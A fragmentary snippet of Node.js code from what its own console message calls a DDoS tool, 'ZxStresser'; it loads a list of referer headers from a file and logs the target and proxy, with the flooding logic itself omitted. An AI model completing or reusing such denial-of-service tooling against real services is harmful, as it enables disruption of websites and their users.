...
const referers = fs.readFileSync('re.txt', 'utf-8').replace(/\r/g, '').split('\n');


console.log(chalk.green(`Sendding Attack Ddos By ZxStresser`));
...
function BrowserEngine()
{
    ...
    console.log(chalk.green(`Target --> ${target} Proxy --> [${proxy}]`));
